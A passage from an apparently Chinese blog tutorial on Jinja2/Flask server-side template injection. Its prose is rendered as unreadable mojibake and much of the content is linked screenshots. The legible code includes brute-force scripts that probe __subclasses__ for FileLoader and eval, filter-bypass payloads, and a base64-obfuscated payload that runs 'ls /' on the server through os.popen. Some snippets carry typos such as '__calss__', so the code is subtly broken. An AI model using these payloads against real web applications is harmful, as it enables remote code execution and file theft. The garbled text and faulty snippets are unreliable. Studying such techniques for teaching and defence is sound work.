&#123;&#123;my_str&#125;&#125;
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/38258db68de7475aa1b8956574a62d0c.png" alt="456"></p>
<h2 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h2><p><img src="https://img-blog.csdnimg.cn/a18c5bfd821244b4aa43c18c4d6fbbd2.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/da03c4e385134b32b89dad29d09e8b47.png" alt="456"></p>
<h3 id="ç»§æ‰¿å…³ç³»"><a href="#ç»§æ‰¿å…³ç³»" class="headerlink" title="ç»§æ‰¿å…³ç³»"></a>ç»§æ‰¿å…³ç³»</h3><p><img src="https://img-blog.csdnimg.cn/977f7e20ead84e11ad7203444a349bbc.png" alt="456"><br>åœ¨ python ä¸­ï¼Œç±»ä¹‹é—´æ˜¯ä¼šæœ‰ç»§æ‰¿å…³ç³»çš„ï¼Œä¹Ÿå°±æ˜¯æ´¾ç”Ÿç±»ï¼ˆå­ç±»ï¼‰ä¸åŸºç±»ï¼ˆçˆ¶ç±»ï¼‰çš„å…³ç³»ï¼Œè¿™å¯ä»¥ç†è§£ä¸ºçˆ¶å­å…³ç³»ã€‚åœ¨è¿™ä¸ªçˆ¶å­å…³ç³»ä¸­çš„æœ€é«˜çº§ï¼Œå°±æ˜¯ object ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œobject æ˜¯ç¥–å®—ç±»ã€‚<br>ä¸€èˆ¬æ¥è¯´ï¼ŒSSTI æ„é€  payload çš„æ€æƒ³ï¼Œå°±æ˜¯è¦é€šè¿‡å„ä¸ªæ•°æ®ç±»å‹ Numbersï¼ˆæ•°å­—ï¼‰Stringï¼ˆå­—ç¬¦ä¸²ï¼‰Listï¼ˆåˆ—è¡¨ï¼‰Tupleï¼ˆå…ƒç»„ï¼‰Dictionaryï¼ˆå­—å…¸ï¼‰ è¿™äº›å­ç±»ï¼Œä¸€ç›´å¾€ä¸Šæ‰¾åˆ° object ï¼Œç„¶åå†é€šè¿‡æ‰¾ object ç±»å¯ä»¥åˆ©ç”¨çš„å­ç±»ã€‚å¯ä»¥åˆ©ç”¨çš„å­ç±»ï¼Œå°±æ˜¯è¿™ä¸ªå­ç±»çš„æ–¹æ³•ï¼ˆpopen() eval()ç­‰æ–¹æ³•ï¼‰æˆ–å±æ€§å¯ä»¥åˆ©ç”¨ã€‚</p>
<p>å†™ä¸€ä¸ªä»£ç ç†è§£ä¸€ä¸‹</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">:</span><span class="token keyword">pass</span> <span class="token comment">#å®šä¹‰äº†ä¸€ä¸ªåä¸ºAçš„ç©ºç±»</span>
<span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">pass</span> <span class="token comment">#å®šä¹‰äº†ä¸€ä¸ªåä¸ºBçš„ç±»ï¼Œå®ƒç»§æ‰¿è‡ªAç±»</span>
<span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">pass</span> <span class="token comment">#å®šä¹‰äº†ä¸€ä¸ªåä¸ºCçš„ç±»ï¼Œå®ƒç»§æ‰¿è‡ªBç±»</span>
<span class="token keyword">class</span> <span class="token class-name">D</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">pass</span> <span class="token comment">#å®šä¹‰äº†ä¸€ä¸ªåä¸ºDçš„ç±»ï¼Œå®ƒç»§æ‰¿è‡ªBç±»</span>
c<span class="token operator">=</span>C<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#åˆ›å»ºäº†ä¸€ä¸ªCç±»çš„å®ä¾‹c</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿™é‡Œå°†Cç±»å®ä¾‹åŒ–ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œæ‰“å°å‡ºå®ä¾‹cçš„ç±»å¯¹è±¡</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span><span class="token comment"># __class__ æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å±æ€§ï¼Œç”¨äºè·å–å¯¹è±¡çš„ç±»</span>
<span class="token comment">#ç»“æœ&lt;class '__main__.C'></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">)</span>
<span class="token comment">#ç»“æœ&lt;class '__main__.B'></span>
<span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__base__<span class="token punctuation">)</span>
<span class="token comment">#ç»“æœ&lt;class '__main__.A'></span>
<span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__base__<span class="token punctuation">)</span>
<span class="token comment">#ç»“æœ&lt;class 'object'></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æœ€ç»ˆæŒ‡å‘å°±æ˜¯Object<br>è¿˜æœ‰ä¸€ç§æ–¹æ³•å¯ä»¥å»æ˜¾ç¤ºå‡ºæ¥</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">)</span><span class="token comment"># __mro__ æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å±æ€§ï¼Œç”¨äºè·å–ä¸€ä¸ªç±»æˆ–å®ä¾‹çš„æ–¹æ³•è§£æé¡ºåºï¼ˆMethod Resolution Order</span>
<span class="token comment">#ç»“æœ(&lt;class '__main__.C'>, &lt;class '__main__.B'>, &lt;class '__main__.A'>, &lt;class 'object'>)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment">#ç»“æœ &lt;class '__main__.C'></span>
<span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment">#ç»“æœ &lt;class '__main__.B'></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/a6a4c1b498844cbfa0315f7a38647fa1.png" alt="123"></p>
<h3 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">__dict__ ä¿å­˜ç±»å®ä¾‹æˆ–å¯¹è±¡å®ä¾‹çš„å±æ€§å˜é‡é”®å€¼å¯¹å­—å…¸
__class__  è¿”å›ç±»å‹æ‰€å±çš„å¯¹è±¡
__mro__    è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚
__bases__   è¿”å›è¯¥å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»
// __base__å’Œ__mro__éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„

__subclasses__   æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªç±»ä¸­ä»ç„¶å¯ç”¨çš„çš„å¼•ç”¨çš„åˆ—è¡¨
__init__  ç±»çš„åˆå§‹åŒ–æ–¹æ³•
__globals__  å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="æ£€æŸ¥æ¼æ´"><a href="#æ£€æŸ¥æ¼æ´" class="headerlink" title="æ£€æŸ¥æ¼æ´"></a>æ£€æŸ¥æ¼æ´</h3><p><img src="https://img-blog.csdnimg.cn/caeb1dcd2e444e3889a444e1dba2c909.png" alt="546"><br><img src="https://img-blog.csdnimg.cn/d6d9edfdac9a48c0a5d30ce2ceca4a32.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/bdc2dafed414478985d6ed6fabec0e45.png" alt="456"></p>
<h3 id="å¸¸ç”¨æ³¨å…¥æ¨¡å—"><a href="#å¸¸ç”¨æ³¨å…¥æ¨¡å—" class="headerlink" title="å¸¸ç”¨æ³¨å…¥æ¨¡å—"></a>å¸¸ç”¨æ³¨å…¥æ¨¡å—</h3><p><img src="https://img-blog.csdnimg.cn/3dec8eda7ce74583aaae7bacab9cdb0d.png" alt="123"></p>
<h4 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h4><p>pythonè„šæœ¬ï¼šPOSTæäº¤â€nameâ€œçš„å€¼ï¼Œé€šè¿‡forå¾ªç¯æŸ¥æ‰¾æ‰€éœ€å­—ç¬¦ä¸²</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'è¯·è¾“å…¥URLé“¾æ¥ï¼š'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"&#123;&#123;().__class__.__base__.__subclasses__()["</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"]&#125;&#125;"</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token comment">#print(response.text)</span>
        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token string">'_frozen_importlib_external.FileLoader'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            	<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è„šæœ¬çµæ´»è¿ç”¨ï¼ŒæŒ‰ç…§å®é™…æƒ…å†µä¿®æ”¹<br><img src="https://img-blog.csdnimg.cn/75239b4fe04e4ce3b6eb5b55bc11f334.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/df0ff4b811074b499ae0fef8df76734f.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/306d33271c3341f68d9922a4f308591d.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/eb63bef8c10341eea65da7ec1eb02690.png" alt="123"></p>
<h4 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h4><p>å†…å»ºå‡½æ•°ï¼špythonåœ¨æ‰§è¡Œè„šæœ¬æ—¶è‡ªåŠ¨åŠ è½½çš„å‡½æ•°<br>è„šæœ¬ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'è¯·è¾“å…¥URLé“¾æ¥ï¼š'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"&#123;&#123;().__class.__base__.__subclasses__()["</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"].__init__.__globals__['__builtins__']&#125;&#125;"</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token comment">#print(response.text)</span>
        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token string">'eval'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/6721439df92e49ac8f19f59ef2a72dee.png" alt="123"></p>
<p><code>&#123;&#123;self.__dict__._TemplateReference__context.keys()&#125;&#125;</code><br>æ˜¾ç¤ºå‡ºå½“å‰ç›®å½•æœ‰å“ªäº›å†…ç½®çš„å¯¹è±¡å’Œå‡½æ•°<br><img src="https://img-blog.csdnimg.cn/52affb08455e46979134e9f9007df484.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/fb950d9977db4dbf8b5cdd198d375543.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/3b890900c6e64a8cb894283d4f54549e.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/8318ba4390ef4d55ba6180f9e3d72d71.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/eb210962dd7946399de23043c7bcc9c2.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/7e6bbbaf4ace4c32b4e022a06cb73dd6.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/2f7da1b5b3e94582ba7e48918c73d01d.png" alt="123"></p>
<h3 id="ç»•è¿‡è¿‡æ»¤åŒå¤§æ‹¬å·"><a href="#ç»•è¿‡è¿‡æ»¤åŒå¤§æ‹¬å·" class="headerlink" title="ç»•è¿‡è¿‡æ»¤åŒå¤§æ‹¬å·"></a>ç»•è¿‡è¿‡æ»¤åŒå¤§æ‹¬å·</h3><p><img src="https://img-blog.csdnimg.cn/843f81905523465d81afb8d2ca8c14e7.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/44f353805abf4973bc97d424f7055dc7.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/9e890759aafd44ee880e1d2449eed86b.png" alt="456"></p>
<p><img src="https://img-blog.csdnimg.cn/0a11a96296bb45e8b97038bd17f989f4.png" alt="456"></p>
<h3 id="æ— å›æ˜¾SSTI"><a href="#æ— å›æ˜¾SSTI" class="headerlink" title="æ— å›æ˜¾SSTI"></a>æ— å›æ˜¾SSTI</h3><p><img src="https://img-blog.csdnimg.cn/82b05ea854bd43c4a6689747d03aaf90.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/58f91b0ea44945efbea06531fa8d0c18.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/d3ccb83ee5d84e29b3439bda5ccc472b.png" alt="789"></p>
<p><img src="https://img-blog.csdnimg.cn/672ebb6c2fc04b70a944b1a5adeb2000.png" alt="123"></p>
<h3 id="getitemç»•è¿‡ä¸­æ‹¬å·è¿‡æ»¤"><a href="#getitemç»•è¿‡ä¸­æ‹¬å·è¿‡æ»¤" class="headerlink" title="getitemç»•è¿‡ä¸­æ‹¬å·è¿‡æ»¤"></a>getitemç»•è¿‡ä¸­æ‹¬å·è¿‡æ»¤</h3><p> æ­£å¸¸ä½¿ç”¨<code>[]</code>æ—¶<br><code> &#123;&#123;''.__calss__.__base__.subclasses__()[117]&#125;&#125;</code><br>ä½¿ç”¨getitemç»•è¿‡<br><code>&#123;&#123;''.__calss__.__base__.subclasses__().__getitem__(117)&#125;&#125;</code><br><img src="https://img-blog.csdnimg.cn/a9db3d6fefeb43b79b67cba773b9b35f.png" alt="123"></p>
<h3 id="requestç»•è¿‡å•åŒå¼•å·è¿‡æ»¤"><a href="#requestç»•è¿‡å•åŒå¼•å·è¿‡æ»¤" class="headerlink" title="requestç»•è¿‡å•åŒå¼•å·è¿‡æ»¤"></a>requestç»•è¿‡å•åŒå¼•å·è¿‡æ»¤</h3><p><img src="https://img-blog.csdnimg.cn/0498fbef7bdf44af8fb9901a42397b70.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/0d25651fb09747b58d80bf62fd7a4924.png" alt="123"> <img src="https://img-blog.csdnimg.cn/4fa2f3bb6f31499ca1cd233021e76b3a.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/b2a5b3fea2be4f459debf419da9c668d.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/9725d59f92c6414fa6bf79e987ef8d41.png" alt="456"></p>
<h3 id="è¿‡æ»¤å™¨ç»•è¿‡ä¸‹åˆ’çº¿è¿‡æ»¤"><a href="#è¿‡æ»¤å™¨ç»•è¿‡ä¸‹åˆ’çº¿è¿‡æ»¤" class="headerlink" title="è¿‡æ»¤å™¨ç»•è¿‡ä¸‹åˆ’çº¿è¿‡æ»¤"></a>è¿‡æ»¤å™¨ç»•è¿‡ä¸‹åˆ’çº¿è¿‡æ»¤</h3><p><img src="https://img-blog.csdnimg.cn/c94604ff42234859be94be5fd95995d1.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/9f77f111586a4a7bb36576882e392bd0.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/e54f250d97794204bd0ea7a7a5358e8d.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/a9ab18ed669941afa2e9ab7a3a000480.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/b2605697c1f0494baff5ae23a6195692.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/d50175a108264f048e38e4162bf25d2d.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/766e77f05f154194bf82a7b2e5298e03.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/2bcf11b047e348c8b4d36ddd1b71af40.png" alt="789"></p>
<h3 id="ä¸­æ‹¬å·ç»•è¿‡ç‚¹è¿‡æ»¤"><a href="#ä¸­æ‹¬å·ç»•è¿‡ç‚¹è¿‡æ»¤" class="headerlink" title="ä¸­æ‹¬å·ç»•è¿‡ç‚¹è¿‡æ»¤"></a>ä¸­æ‹¬å·ç»•è¿‡ç‚¹è¿‡æ»¤</h3><p><img src="https://img-blog.csdnimg.cn/07a73d95f15949b994c50dda1355bdaf.png" alt="789"></p>
<h3 id="ç»•è¿‡å…³é”®å­—è¿‡æ»¤"><a href="#ç»•è¿‡å…³é”®å­—è¿‡æ»¤" class="headerlink" title="ç»•è¿‡å…³é”®å­—è¿‡æ»¤"></a>ç»•è¿‡å…³é”®å­—è¿‡æ»¤</h3><p><img src="https://img-blog.csdnimg.cn/b02c0b719d1b4b40b62593daad6508cf.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/b1ec1ebc3718402da007db1d5536e12a.png" alt="12"><br><img src="https://img-blog.csdnimg.cn/bc9d91b3c45e487ebe7d2383a52f3712.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/3de5244222804c66bd3d90b90516d6d6.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/2b1365da13f84927bcc32e37cbbf1943.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/fd34e24cf8dc4bcf9ca6d47d4f506abe.png" alt="456"></p>
<h3 id="ç»•è¿‡æ•°å­—è¿‡æ»¤"><a href="#ç»•è¿‡æ•°å­—è¿‡æ»¤" class="headerlink" title="ç»•è¿‡æ•°å­—è¿‡æ»¤"></a>ç»•è¿‡æ•°å­—è¿‡æ»¤</h3><p>ç¤ºä¾‹ä»£ç ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#app.py</span>
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template
app<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">show1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">index.html
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
        <span class="token selector">.a</span><span class="token punctuation">&#123;</span><span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>
        <span class="token property">font-weight</span><span class="token punctuation">:</span> bold<span class="token punctuation">;</span>

        <span class="token punctuation">&#125;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
å­—ç¬¦ä¸²ä¸ªæ•°ï¼š&#123;% set a='aaaaaaaaaa'|length*'aa'|length*'aaa'|length %&#125;&#123;&#123;a&#125;&#125;
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/3bcdac20b4a846b3945e7b554d5f895d.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/b283f0cd960f429ca31a672895b41f01.png" alt="789"></p>
<h3 id="è·å–configæ–‡ä»¶"><a href="#è·å–configæ–‡ä»¶" class="headerlink" title="è·å–configæ–‡ä»¶"></a>è·å–configæ–‡ä»¶</h3><p><img src="https://img-blog.csdnimg.cn/096ab7cca0394d75830c6f465f6800c1.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/a69000736d8e432f84ce4e62a303cd6f.png" alt="12"></p>
<h3 id="æ··åˆè¿‡æ»¤ç»•è¿‡ä»‹ç»"><a href="#æ··åˆè¿‡æ»¤ç»•è¿‡ä»‹ç»" class="headerlink" title="æ··åˆè¿‡æ»¤ç»•è¿‡ä»‹ç»"></a>æ··åˆè¿‡æ»¤ç»•è¿‡ä»‹ç»</h3><p><img src="https://img-blog.csdnimg.cn/231c722768454962b8d3b5b9360ae042.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/28fd166d9ea84690a33cff39bad5ef03.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/282904a4d77e4dbb85f30e50c7107eba.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/106950159e194978829bfc6bc54bf80a.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/d537cb382c8b4dda9f06968f8630da2f.png" alt="123"></p>
<h4 id="åˆ©ç”¨ç¼–ç ç»•è¿‡"><a href="#åˆ©ç”¨ç¼–ç ç»•è¿‡" class="headerlink" title="åˆ©ç”¨ç¼–ç ç»•è¿‡"></a>åˆ©ç”¨ç¼–ç ç»•è¿‡</h4><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¯¹å…³é”®å­—ç¼–ç çš„æ–¹æ³•ï¼Œç»•è¿‡å…³é”®å­—è¿‡æ»¤ï¼Œä¾‹å¦‚ç”¨base64ç¼–ç ç»•è¿‡ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'X19idWlsdGluc19f'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ZXZhbA=='</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ=='</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ç­‰åŒäºï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token 